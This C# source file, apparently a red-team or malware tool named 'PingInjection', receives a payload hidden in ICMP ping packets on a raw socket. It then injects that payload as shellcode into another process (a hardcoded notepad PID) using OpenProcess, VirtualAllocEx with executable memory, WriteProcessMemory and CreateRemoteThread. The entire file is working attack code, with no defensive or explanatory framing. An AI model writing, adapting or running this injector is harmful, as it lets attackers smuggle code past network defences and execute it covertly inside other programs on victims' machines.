using System;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;

namespace PingInjection
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processID);
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr IpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        public static void shellcodeInjection(byte[] shellcode)
        {
            int notepadPID = 7972;
            IntPtr hProcess = OpenProcess(0x001F0FFF, false, notepadPID);
            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
            byte[] buf = shellcode;
            IntPtr outSize;
            WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        }

        public static byte[] getShellcode()
        {
            Socket icmpListener = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.Icmp);
            icmpListener.Bind(new IPEndPoint(IPAddress.Parse("192.168.0.15"), 0));
            icmpListener.IOControl(IOControlCode.ReceiveAll, new byte[] { 1, 0, 0, 0 }, new byte[] { 1, 0, 0, 0 });
            byte[] buffer = new byte[4096];
            EndPoint remoteEndPoint = new IPEndPoint(IPAddress.Any, 0);
            byte[] shellcode = new byte[4068];

            var bytesRead = icmpListener.ReceiveFrom(buffer, ref remoteEndPoint);
            System.Buffer.BlockCopy(buffer, 28, shellcode, 0, 4068);
            return shellcode;
        }


        static void Main(string[] args)
        {
            byte[] shellcode = getShellcode();
            shellcodeInjection(shellcode);
        }
    }
}
